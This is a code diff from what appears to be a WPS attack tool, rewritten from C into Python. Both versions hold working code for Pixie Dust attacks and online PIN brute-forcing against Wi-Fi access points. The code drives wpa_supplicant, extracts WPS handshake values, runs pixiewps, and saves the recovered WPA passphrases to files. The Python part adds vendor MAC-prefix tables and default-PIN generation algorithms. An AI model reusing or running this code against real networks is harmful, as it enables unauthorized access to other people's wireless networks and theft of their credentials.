-	char reports_dir[256];
-	FILE *wpas;
-	wpa_ctrl_t ctrl;
-	connection_status_t connection_status;
-	pixiewps_data_t pixiewps_data;
-	bruteforce_status_t bruteforce;
-
-	int save_result;
-	int print_debug;
-
-	int status;
-}data_t;
-
-void init(data_t *data,const char *interface,int save_result,int print_debug){
-	const char *oneshot_dir=get_oneshot_dir();
-	sprintf(data->sessions_dir,"%s/sessions",oneshot_dir);
-	sprintf(data->pixiewps_dir,"%s/pixiewps",oneshot_dir);
-	sprintf(data->reports_dir, "%s/reports", oneshot_dir);
-	mkdir(data->sessions_dir,0700);
-	mkdir(data->pixiewps_dir,0700);
-	mkdir(data->reports_dir,0700);
-	data->save_result=save_result;
-	data->print_debug=print_debug;
-	data->interface=interface;
-	data->wpas=run_wpa_supplicant(&data->ctrl,interface);
-}
-void credential_print(pin_t pin,const char *psk,const char *essid){
-	printf("[+] WPS PIN: %08u\n",pin);
-	printf("[+] WPA PSK: %s\n",  psk);
-	printf("[+] AP SSID: %s\n",  essid);
-}
-void save_result(data_t *data,mac_t bssid,const char *essid,pin_t pin,const char *psk){
-	time_t now=time(NULL);
-	struct tm *timeinfo=localtime(&now);
-	char time_str[128];
-	strftime(time_str,128,"%d.%m.%Y %H:%M",timeinfo);
-	const char *bssid_str=mac2str(bssid);
-	char path1[128],path2[128];
-	sprintf(path1,"%s/stored.csv",data->sessions_dir);
-	sprintf(path2,"%s/stored.txt",data->sessions_dir);
-
-	FILE *file=fopen(path1,"a");
-	if(file){
-		fseek(file,0,SEEK_END);
-		if(ftell(file)==0)
-			fprintf(file,"\"Date\",\"BSSID\",\"ESSID\",\"WPS PIN\",\"WPA PSK\"");
-		fprintf(file,"\"%s\",\"%s\",\"%s\",\"%08u\",\"%s\"\n",
-			time_str,bssid_str,essid,pin,psk);
-		fclose(file);
-	}
-	file=fopen(path2,"a");
-	if(file){
-		fprintf(file,"%s\nBSSID: %s\nESSID: %s\nWPS PIN: %08u\nWPA PSK: %s\n\n",
-			time_str,bssid_str,essid,pin,psk);
-		fclose(file);
-	}
-	printf("[i] Credentials saves to %s, %s\n",path1,path2);
-}
-void save_pin(data_t *data,mac_t bssid, pin_t pin){
-	char path[128];
-	sprintf(path,"%s/%017llu.run",data->pixiewps_dir,bssid);
-	FILE *file=fopen(path,"w");
-	if(file){
-		fprintf(file,"%08u",pin);
-		fclose(file);
-		printf("[i] Pin saves in %s\n",path);
-	}
-}
-pin_t load_pin(data_t *data,mac_t bssid){
-	pin_t pin=NO_PIN;
-	char path[128];
-	sprintf(path,"%s/%017llu.run",data->pixiewps_dir,bssid);
-	FILE *file=fopen(path,"r");
-	if(file){
-		fscanf(file,"%08u",&pin);
-		fclose(file);
-	}
-	return pin;
-}
-pin_t prompt_wpspin(mac_t bssid){
-	unsigned long long int bytes=suggest(bssid);
-	size_t pin_count=0;
-	size_t type;
-	struct result_t{
-		pin_t pin;
-		const char *name;
-	}results[PIN_TYPES_COUNT];
-	for(type=0;type<PIN_TYPES_COUNT;type++)
-		if((bytes>>type)&1)
-			results[pin_count++]=(struct result_t){generate_pin(type,bssid),algorithms[type].name};
-	if(pin_count>1){
-		printf("PINs generated by %s:\n",mac2str(bssid));
-		printf("#   PIN        Name\n");
-		size_t line;
-		for(line=0;line<pin_count;line++){
-			char number_str[4];
-			sprintf(number_str,"%d)",line+1);
-			printf("%-3s %08u   %s\n",number_str,
-				results[line].pin,results[line].name);
-		}
-		while(1){
-			printf("Select the PIN: ");
-			size_t input;
-			if(scanf("%u",&input)!=1 || input<1 || input>pin_count)
-				fprintf(stderr,"Invalid number\n");
-			else
-				return results[input-1].pin;
-		}
-	}else if(pin_count==1){
-		printf("[i] The only probable PIN is selected: %s\n",results[0].name);
-		return results[0].pin;
-	}else
-		return NO_PIN;
-}
-void remove_spaces(char* s) {
-    char* d = s;
-    do {
-        while (*d == ' ') {
-            ++d;
+    def _suggest(self, mac):
+        """
+        Get algos suggestions for single MAC
+        Returns the algo ID
+        """
+        mac = mac.replace(':', '').upper()
+        algorithms = {
+            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
+            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
+            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
+            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
+            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
+            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
+            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
+            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
+            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
+            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
+            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
+            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
+            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
+            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
+            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
+            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
+            'pinRealtek2': ('007263', 'E4BEED'),
+            'pinRealtek3': ('08C6B3',),
+            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
+            'pinUR814AC': ('D4BF7F60',),
+            'pinUR825AC': ('D4BF7F5',),
+            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
+            'pinEdimax': ('801F02', '00E04C'),
+            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
+            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
+            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
+            'pinONO': ('5C353B', 'DC537C')
         }
-    } while (*s++ = *d++);
-}
-int handle_wpas(data_t *data,int pixiemode,mac_t bssid){
-	connection_status_t *status=&data->connection_status;
-	pixiewps_data_t *pixie=&data->pixiewps_data;
-	char line[1024];
-	fgets(line,1024,data->wpas);
-	if(*line=='\0'){
-		pclose(data->wpas);
-		return -1;
-	}
-	if(data->print_debug)
-		printf("%s",line);
-	if(strstr(line,"WPS: ")){
-		if(sscanf(line,"WPS: Building Message M%d",&status->last_m_message)==1)
-			printf("[*] Building Message M%d\n",status->last_m_message);
-		else if(sscanf(line,"WPS: Received M%d",&status->last_m_message)==1)
-			printf("[*] Received WPS Message M%d\n",status->last_m_message);
-		else if(strstr(line,"WSC_NACK")){
-			status->status=STATUS_WSC_NACK;
-			printf("[*] Received WSC NACK\n");
-			printf("[-] Error: wrong PIN code\n");
-		}else if(strstr(line,"hexdump")){
-			size_t psk_len;
-			char psk_hex[256];
-			if(sscanf(line,"WPS: Enrollee Nonce - hexdump(len=16): %[^\n]s",pixie->e_nonce)==1){
-				remove_spaces(pixie->e_nonce);
-				if(pixiemode)
-					printf("[P] E-Nonce: %s\n",pixie->e_nonce);
-			}else if(sscanf(line,"WPS: DH own Public Key - hexdump(len=192): %[^\n]s",pixie->pkr)==1){
-				remove_spaces(pixie->pkr);
-				if(pixiemode)
-					printf("[P] PKR: %s\n",pixie->pkr);
-			}else if(sscanf(line,"WPS: DH peer Public Key - hexdump(len=192): %[^\n]s",pixie->pke)==1){
-				remove_spaces(pixie->pke);
-				if(pixiemode)
-					printf("[P] PKE: %s\n",pixie->pke);
-			}else if(sscanf(line,"WPS: AuthKey - hexdump(len=32): %[^\n]s",pixie->authkey)==1){
-				remove_spaces(pixie->authkey);
-				if(pixiemode)
-					printf("[P] Authkey: %s\n",pixie->authkey);
-			}else if(sscanf(line,"WPS: E-Hash1 - hexdump(len=32): %[^\n]s",pixie->e_hash1)==1){
-				remove_spaces(pixie->e_hash1);
-				if(pixiemode)
-					printf("[P] E-Hash1: %s\n",pixie->e_hash1);
-			}else if(sscanf(line,"WPS: E-Hash2 - hexdump(len=32): %[^\n]s",pixie->e_hash2)==1){
-				remove_spaces(pixie->e_hash2);
-				if(pixiemode)
-					printf("[P] E-Hash2: %s\n",pixie->e_hash2);
-			}else if(sscanf(line,"WPS: Network Key - hexdump(len=%u): %[^\n]s",&psk_len,psk_hex)==2){
-				status->status=STATUS_GOT_PSK;
-				size_t n;
-				for(n=0;n<psk_len;n++){
-					char *p=psk_hex+n*3;
-					int input;
-					sscanf(p,"%02X",&input);
-					status->wpa_psk[n]=input;
-				}
-				status->wpa_psk[psk_len]='\0';
-			}
-		}
-	}else if(strstr(line,": State: ") && strstr(line,"-> SCANNING")){
-		status->status=STATUS_SCANNING;
-		printf("[*] Scanning...\n");
-	}else if(strstr(line,"WPS-FAIL") && status->status!=STATUS_NO){
-		status->status=STATUS_WPS_FAIL;
-		printf("[-] wpa_supplicant returned WPS-FAIL\n");
-	}else if(strstr(line,"Trying to authenticate with")){
-		status->status=STATUS_AUTHENTICATING;
-		if(strstr(line,"SSID")){
-			char *str=strstr(line,"'");
-			sscanf(str,"'%s'",status->essid);
-		}
-		printf("[*] Authenticating...\n");
-	}else if(strstr(line,"Authentication response"))
-		printf("[+] Authenticated\n");
-	else if(strstr(line,"Trying to associate with")){
-		status->status=STATUS_ASSOCIATING;
-		if(strstr(line,"SSID")){
-			char *str=strstr(line,"'")+1;
-			char *p=str;
-			while(*p!='\'')p++; *p='\0';
-			strcpy(status->essid,str);
-		}
-		printf("[*] Associating with AP...\n");
-	}else if(strstr(line,"Associated with") &&
-	         strstr(line,data->interface)){
-		if(*status->essid!='\0')
-			printf("[+] Associated with %s (ESSID: %s)\n",
-				mac2str(bssid),status->essid);
-		else
-			printf("[+] Associated with %s\n",mac2str(bssid));
-	}else if(strstr(line,"EAPOL: txStart")){
-		status->status=STATUS_EAPOL_START;
-		printf("[*] Sending EAPOL Start...\n");
-	}else if(strstr(line,"EAP entering state IDENTITY"))
-		printf("[*] Received Identity Request\n");
-	else if(strstr(line,"using real identity"))
-		printf("[*] Sending Identity Response...\n");
+        res = []
+        for algo_id, masks in algorithms.items():
+            if mac.startswith(masks):
+                res.append(algo_id)
+        return res
 
-	return 0;
-}
-pin_t run_pixiwps(pixiewps_data_t *data, int showcmd,int full_range){
-	printf("[*] Running Pixiewps...\n");
-	char cmd[2048];
-	get_pixiewps_cmd(data,full_range,cmd);
-	if(showcmd)
-		printf("%s\n",cmd);
-	FILE *pixiewps=popen(cmd,"r");
-	char line[256];
-	pin_t pin=NO_PIN;
-	char pin_str[10];
-	while(!feof(pixiewps)){
-		fgets(line,256,pixiewps);
-		printf("%s",line);
-		if(sscanf(line," [+] WPS pin:  %s",pin_str)==1){
-			if(strcmp(pin_str,"<empty>")==0){
-				pin=EMPTY_PIN;
-				break;
-			}
-			sscanf(pin_str,"%08u",&pin);
-			break;
-		}
-	}
-	pclose(pixiewps);
-	return pin;
-}
-void wps_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode){
-	memset(&data->pixiewps_data,0,sizeof(pixiewps_data_t));
-	memset(&data->connection_status,0,sizeof(connection_status_t));
-	char buf[300]; /* clean pipe */
-	fread(buf,1,300,data->wpas);
-	printf("[*] Trying pin %08u...\n",pin);
+    def pin24(self, mac):
+        return mac.integer & 0xFFFFFF
 
-	char input[256];
-	sprintf(input,"WPS_REG %s %08u",mac2str(bssid),pin);
-	char output[256];
-	wpa_ctrl_send_recv(&data->ctrl,input,output,256);
-	if(strstr(output,"OK")==NULL){
-		data->connection_status.status=STATUS_WPS_FAIL;
-		if(strstr(output,"UNKNOWN COMMAND"))
-			fprintf(stderr,"[!] It looks like your wpa_supplicant is "
-			       "compiled without WPS protocol support. "
-			       "Please build wpa_supplicant with WPS "
-			       "support (\"CONFIG_WPS=y\")\n");
-		else
-			fprintf(stderr,"[!] Something went wrong — check out debug log\n");
-		return;
-	}
-	while(1){
-		int res=handle_wpas(data,pixiemode,bssid);
-		if(res)
-			break;
-		if(data->connection_status.status==STATUS_WPS_FAIL)
-			break;
-		if(data->connection_status.status==STATUS_GOT_PSK)
-			break;
-		if(data->connection_status.status==STATUS_WSC_NACK)
-			break;
-	}
-	wpa_ctrl_send(&data->ctrl,"WPS_CANCEL");
-}
-void single_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode,
-			int showpixiesmd,int pixieforce){
-	if(pin==NO_PIN){
-		if(pixiemode){
-			/* Try using the previously calculated PIN */
-			pin_t loaded_pin=load_pin(data,bssid);
-			if(loaded_pin!=NO_PIN){
-				printf("[?] Use previously calculated PIN %08u? [n/Y] ",pin);
-				int input=getc(stdin);
-				if(input=='y' || input=='Y')
-					pin=loaded_pin;
-			}
-			if(pin==NO_PIN)
-				pin=get_likely(bssid);
-			if(pin==NO_PIN)
-				pin=12345670;
-		}else{
-			pin=prompt_wpspin(bssid);
-			if(pin==NO_PIN)
-				pin=12345670;
-		}
-	}
-	wps_connection(data,bssid,pin,pixiemode);
-	if(data->connection_status.status==STATUS_GOT_PSK){
-		credential_print(pin,data->connection_status.wpa_psk,
-		                     data->connection_status.essid);
-		if(data->save_result)
-			save_result(data,bssid,
-			            data->connection_status.essid,pin,
-			            data->connection_status.wpa_psk);
-		char pin_path[128];
-		sprintf(pin_path,"%s/%017llu.run",data->pixiewps_dir,bssid);
-		remove(pin_path);
-	}else if(pixiemode){
-		if(got_all_pixieps_data(&data->pixiewps_data)){
-			pin=run_pixiwps(&data->pixiewps_data,showpixiesmd,pixieforce);
-			if(pin!=NO_PIN)
-				return single_connection(data,bssid,pin,
-						0,showpixiesmd,pixieforce);
+    def pin28(self, mac):
+        return mac.integer & 0xFFFFFFF
 
-		}else
-			fprintf(stderr,"[!] Not enough data to run Pixie Dust attack\n");
-	}
+    def pin32(self, mac):
+        return mac.integer % 0x100000000
 
-}
-void delay_ms(int ms){
-    clock_t start_time = clock();
-    while (clock() < start_time + ms);
-}
-pin_t first_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,int delay){
-	while(f_half<10000){
-		pin_t pin=f_half*10000+checksum(f_half*10000);
-		single_connection(data,bssid,pin,0,0,0);
-		if(data->connection_status.last_m_message>5){
-			printf("[+] First half found\n");
-			return f_half;
-		}else if(data->connection_status.status==STATUS_WPS_FAIL){
-			fprintf(stderr,"[!] WPS transaction failed, re-trying last pin");
-			return first_half_bruteforce(data,bssid,f_half,delay);
-		}
-		f_half++;
-		register_bruteforce_attempt(&data->bruteforce,f_half);
-		delay_ms(delay*1000);
-	}
-	fprintf(stderr,"[-] First half not found\n");
-	return NO_PIN;
-}
-pin_t second_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,pin_t s_half,int delay){
-	while(s_half<1000){
-		pin_t t=f_half*1000+s_half;
-		pin_t pin=t*10+checksum(t);
-		single_connection(data,bssid,pin,0,0,0);
-		if(data->connection_status.last_m_message>6)
-			return pin;
-		else if(data->connection_status.status==STATUS_WPS_FAIL){
-			fprintf(stderr,"[!] WPS transaction failed, re-trying last pin\n");
-			return second_half_bruteforce(data, bssid, f_half, s_half, delay);
-		}
-		s_half++;
-		register_bruteforce_attempt(&data->bruteforce,t);
-		delay_ms(delay*1000);
-	}
-	return NO_PIN;
-}
-void smart_bruteforce(data_t *data,mac_t bssid,pin_t start_pin,int delay){
-	pin_t mask=0;
-	if(start_pin==NO_PIN || start_pin<10000){
-		pin_t loaded=load_pin(data,bssid);
-		if(loaded!=NO_PIN){
-			printf("[?] Restore previous session for %s? [n/Y] ",mac2str(bssid));
-			int input=getc(stdin);
-			mask=loaded;
-		}
-	}else
-		mask=start_pin/10;
+    def pinDLink(self, mac):
+        # Get the NIC part
+        nic = mac.integer & 0xFFFFFF
+        # Calculating pin
+        pin = nic ^ 0x55AA55
+        pin ^= (((pin & 0xF) << 4) +
+                ((pin & 0xF) << 8) +
+                ((pin & 0xF) << 12) +
+                ((pin & 0xF) << 16) +
+                ((pin & 0xF) << 20))
+        pin %= int(10e6)
+        if pin < int(10e5):
+            pin += ((pin % 9) * int(10e5)) + int(10e5)
+        return pin
 
-	data->bruteforce=(bruteforce_status_t){0};
-	data->bruteforce.mask=mask;
-	data->bruteforce.start_time=time(NULL);
-	data->bruteforce.last_attempt_time=time(NULL);
+    def pinDLink1(self, mac):
+        mac.integer += 1
+        return self.pinDLink(mac)
 
-	if(mask>=10000){
-		pin_t f_half=mask/1000;
-		pin_t s_half=mask%1000;
-		second_half_bruteforce(data,bssid,f_half,s_half,delay);
-	}else{
-		pin_t f_half=first_half_bruteforce(data,bssid,mask,delay);
-		if(f_half!=NO_PIN && data->connection_status.status!=STATUS_GOT_PSK)
-			second_half_bruteforce(data,bssid,f_half,1,delay);
-	}
-}
-void quit(data_t *data){
-	wpa_ctrl_close(&data->ctrl);
-	pclose(data->wpas);
-	remove(data->ctrl.tempdir);
-	remove(data->ctrl.tempcfg);
-}
-typedef struct {
-	time_t time;
-	mac_t bssid;
-	char essid[256];
-	pin_t pin;
-	char psk[256];
-} network_entry_t;
+    def pinASUS(self, mac):
+        b = [int(i, 16) for i in mac.string.split(':')]
+        pin = ''
+        for i in range(7):
+            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
+        return int(pin)
 
-network_entry_t read_csv_str(char *str) {
-	network_entry_t network;
-	char *last=NULL;
-	int index=0;
-	while(*str) {
-		if(last && *str=='"') {
-			char c=*str;
-			*str='\0';
-			switch(index++) {
-			case 0: {
-				int month;
-				struct tm time;
-				sscanf(last,"%2d.%2d.%4d %2d:%2d",
-				       &time.tm_year,
-				       &month,
-					   &time.tm_mday,
-				       &time.tm_hour,
-				       &time.tm_min);
-				time.tm_mon=month-1;
-				network.time=mktime(&time);
-			}
-			break;
-			case 1:
-				network.bssid=str2mac(last);
-				break;
-			case 2:
-				strcpy(network.essid,last);
-				break;
-			case 3:
-				sscanf(last,"%8u",&network.pin);
-				break;
-			case 4:
-				strcpy(network.psk,last);
-				break;
-			}
-			last=NULL;
-			*str=c;
-		} else if(!last && *str=='"')
-			last=str+1;
-		str++;
-	}
-	return network;
-}
-network_entry_t *read_csv(const char *path,size_t *count) {
-	FILE *file=fopen(path,"r");
-	if(!file)return NULL;
+    def pinAirocon(self, mac):
+        b = [int(i, 16) for i in mac.string.split(':')]
+        pin = ((b[0] + b[1]) % 10)\
+        + (((b[5] + b[0]) % 10) * 10)\
+        + (((b[4] + b[5]) % 10) * 100)\
+        + (((b[3] + b[4]) % 10) * 1000)\
+        + (((b[2] + b[3]) % 10) * 10000)\
+        + (((b[1] + b[2]) % 10) * 100000)\
+        + (((b[0] + b[1]) % 10) * 1000000)
+        return pin
 
-	size_t lines=count_lines(file);
 
-	network_entry_t *networks=(network_entry_t*)malloc(sizeof(network_entry_t)*(lines-1));
-	unsigned int l;
-	for(l=0; l<lines; l++) {
-		char str[1024];
-		fgets(str,1024,file);
-		if(l!=0 && *str!='\0')
-			networks[l-1]=read_csv_str(str);
-	}
+def recvuntil(pipe, what):
+    s = ''
+    while True:
+        inp = pipe.stdout.read(1)
+        if inp == '':
+            return s
+        s += inp
+        if what in s:
+            return s
 
-	fclose(file);
-	if(count)
-		*count=lines-1;
-	return networks;
-}
 
-enum {
-	SECURITY_OPEN,
-	SECURITY_WEP,
-	SECURITY_WPA,
-	SECURITY_WPA2,
-	SECURITY_WPA_WPA2,
-};
-typedef struct {
-	mac_t bssid;
-	char essid[256];
-	int signal;
-	int security;
-	int wps_locked;
-	char model[256];
-	char model_number[256];
-	char device_name[256];
-} network_info_t;
+def get_hex(line):
+    a = line.split(':', 3)
+    return a[2].replace(' ', '').upper()
 
-int compare_network_info(const void *n1, const void *n2) {
-	return ((const network_info_t*)n2)->signal-((const network_info_t*)n1)->signal;
-}
-mac_t scan_wifi(const char *interface, char **vuln_list,int reverse_scan) {
-	char reports_path[256];
-	sprintf(reports_path,"%s/reports/stored.csv",get_oneshot_dir());
-	size_t saves_count;
-	network_entry_t *saves=read_csv(reports_path,&saves_count);
 
-	char smd[64];
-	snprintf(smd,64,"iw dev %s scan 2>&1",interface);
+class PixiewpsData:
+    def __init__(self):
+        self.pke = ''
+        self.pkr = ''
+        self.e_hash1 = ''
+        self.e_hash2 = ''
+        self.authkey = ''
+        self.e_nonce = ''
 
-	/* parse iw output */
-	FILE *output=popen(smd,"r");
+    def clear(self):
+        self.__init__()
 
-	network_info_t scanned[100];
-	network_info_t *network=scanned-1;
+    def got_all(self):
+        return (self.pke and self.pkr and self.e_nonce and self.authkey
+                and self.e_hash1 and self.e_hash2)
 
-	int network_count=0;
-	int wps=1;
+    def get_pixie_cmd(self, full_range=False):
+        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
+                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
+                    self.pke, self.pkr, self.e_hash1,
+                    self.e_hash2, self.authkey, self.e_nonce)
+        if full_range:
+            pixiecmd += ' --force'
+        return pixiecmd
 
-	while(!feof(output)) {
-		char buf[1024];
-		fgets(buf,1024,output);
-		char *str=buf;
-		while(*str=='\t' || *str==' ')str++;
-		if(strstr(str,"command failed:")) {
-			fprintf(stderr,"[!] Error: %s",str);
-			return NO_MAC;
-		} else if(strstr(str,"(on")) {
-			if(wps){
-				network++;
-				network_count++;
-				wps=0;
-			}
-			char bssid_str[18];
-			sscanf(str,"BSS %17s",bssid_str);
-			network->bssid=str2mac(bssid_str);
-		} else if(strstr(str,"SSID"))
-			sscanf(str,"SSID: %[^\n]s",network->essid);
-		else if(strstr(str,"signal"))
-			sscanf(str,"signal: %d dBm",&network->signal);
-		else if(strstr(str,"capability")) {
-			if(strstr(str,"Privacy"))
-				network->security=SECURITY_WEP;
-			else
-				network->security=SECURITY_OPEN;
-		} else if(strstr(str,"RSN")) {
-			if(network->security==SECURITY_WEP)
-				network->security=SECURITY_WPA2;
-			else if(network->security==SECURITY_WPA)
-				network->security=SECURITY_WPA_WPA2;
-		} else if(strstr(str,"WPA")) {
-			if(network->security==SECURITY_WEP)
-				network->security=SECURITY_WPA;
-			else if(network->security==SECURITY_WPA2)
-				network->security=SECURITY_WPA_WPA2;
-		} else if(strstr(str,"WPS:"))
-			wps=1;
-		else if(strstr(str,"setup"))
-			sscanf(str,"* AP setup locked: 0x%x",&network->wps_locked);
-		else if(strstr(buf,"Model:"))
-			sscanf(str,"* Model: %[^\n]s",network->model);
-		else if(strstr(str,"Model Number:"))
-			sscanf(str,"* Model Number: %[^\n]s",network->model_number);
-		else if(strstr(str,"Device name:"))
-			sscanf(str,"* Device name: %[^\n]s",network->device_name);
-	}
-	pclose(output);
-	if(!wps)
-		network_count--;
-	qsort(scanned,network_count,sizeof(network_info_t),compare_network_info);
 
-	if(network_count) {
-		const char *red=	"\033[91m";
-		const char *green=	"\033[92m";
-		const char *yellow=	"\033[93m";
-		const char *clear=	"\033[0m";
-		if(vuln_list)
-			printf("Network marks: "
-				   "%sPossibly vulnerable%s | "
-				   "%sWPS locked%s | "
-				   "%sAlready stored%s\n",
-				   green,clear,red,clear,yellow,clear);
-		printf("Network list:\n");
-		printf("%-4s %-18s %-25s %-8s %-4s %-27s %s\n",
-			   "#", "BSSID", "ESSID", "Sec.", "PWR", "WSC device name", "WSC model");
+class ConnectionStatus:
+    def __init__(self):
+        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.last_m_message = 0
+        self.essid = ''
+        self.wpa_psk = ''
 
-		int i=0;
-		if(reverse_scan)
-			i=network_count-1;
-		while(i!=(reverse_scan?-1:network_count)) {
-			network_info_t *network=scanned+i;
-			const char *security;
-			switch(network->security) {
-			case SECURITY_OPEN:
-				security="Open";
-				break;
-			case SECURITY_WEP:
-				security="WEP";
-				break;
-			case SECURITY_WPA:
-				security="WPA";
-				break;
-			case SECURITY_WPA2:
-				security="WPA2";
-				break;
-			case SECURITY_WPA_WPA2:
-				security="WPA/WPA2";
-				break;
-			}
-			char model[256];
-			char number[5];
-			sprintf(model,"%s %s",network->model,network->model_number);
+    def isFirstHalfValid(self):
+        return self.last_m_message > 5
 
-			sprintf(number,"%d)",i+1);
+    def clear(self):
+        self.__init__()
 
-			int stored=0;
-			int vulnerable=0;
-			if(saves) {
-				unsigned int i;
-				for(i=0; i<saves_count; i++) {
-					if(network->bssid==saves[i].bssid &&
-						    strcmp(network->essid,saves[i].essid)==0) {
-						stored=1;
-						break;
-					}
-				}
-			}
-			if(!stored && vuln_list && !network->wps_locked) {
